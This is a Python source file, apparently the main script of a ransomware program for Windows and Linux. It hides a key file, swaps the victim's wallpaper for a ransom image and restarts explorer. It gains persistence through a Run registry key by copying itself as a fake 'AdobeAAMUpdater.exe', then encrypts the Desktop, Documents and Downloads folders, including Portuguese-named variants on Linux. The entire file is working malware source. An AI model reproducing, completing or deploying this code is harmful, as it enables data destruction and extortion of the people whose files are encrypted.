from Functions.Encrypt_Func import Crypt
from Functions.Encrypt_Func import k
from Functions.Encrypt_Func import s
from os import path,getenv
from sys import argv
from os import system as sys
from shutil import copyfile
from winreg import *

if s=='Windows':
	desktop = path.expanduser('~/Desktop')
	documents = path.expanduser('~/Documents')
	downloads = path.expanduser('~/Downloads')

	try:
		with open(documents+'/.officek','wb') as key:
			key.write(k)
		sys('cd '+documents)
		sys('attrib +s +h '+documents+'/.officek')
	except:
		try:
			with open('C:/Users/Public/.officek','wb') as key:
				key.write(k)
			sys('cd C:/Users/Public')
			sys('attrib +s +h C:/Users/Public/.officek')
		except:
			pass

	try:
		bg = Crypt.resource_path('bg.jpg')
	except:
		pass

	try:
		appdata = getenv('APPDATA')
		dest = appdata+'/Microsoft/Windows/Themes'
		copyfile(dest+'/TranscodedWallpaper',dest+'/.transold')
		copyfile(bg,dest+"/TranscodedWallpaper")
		sys('cd '+dest)
		sys('attrib +s +h '+dest+'/.transold')
		sys("taskkill /f /im explorer.exe")
		sys("start C:/Windows/explorer.exe")
	except:
		try:
			appdata = getenv('APPDATA')
			dest = appdata+'/Microsoft/Windows/Themes'
			copyfile(dest+'/TranscodedWallpaper.jpg',dest+'/.transold')
			copyfile(bg,dest+"/TranscodedWallpaper.jpg")
			sys('cd '+dest)
			sys('attrib +s +h '+dest+'/.transold')
			sys("taskkill /f /im explorer.exe")
			sys("start C:/Windows/explorer.exe")
		except:
			pass

	keypath = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
	try:
		key = CreateKey(HKEY_LOCAL_MACHINE, keypath)
	except PermissionError:
		try:
			key = CreateKey(HKEY_CURRENT_USER, keypath)
		except:
			pass
	
	try:
		copyfile(argv[0],'C:/Users/Public/AdobeAAMUpdater.exe')
		p = 'C:\\Users\\Public\\AdobeAAMUpdater.exe'
		SetValueEx(key, "AdobeAAM", 0, REG_SZ, p)
	except:
		pass

	Crypt.c_iterator(desktop)
	Crypt.c_iterator(documents)
	Crypt.c_iterator(downloads)

	Crypt.infectall()

elif s=='Linux':
	desktop = path.expanduser('~/Desktop')
	documents = path.expanduser('~/Documents')
	downloads = path.expanduser('~/Downloads')
	area = path.expanduser('~/Área de trabalho')
	documentos = path.expanduser('~/Documentos')

	try:
		with open(documents+'/.officek','wb') as key:
			key.write(k)
	except:
		try:
			with open(documentos+'/.officek','wb') as key:
				key.write(k)
		except:
			pass

	Crypt.c_iterator(desktop)
	Crypt.c_iterator(area)
	Crypt.c_iterator(documents)
	Crypt.c_iterator(documentos)
	Crypt.c_iterator(downloads)

	Crypt.infectall()
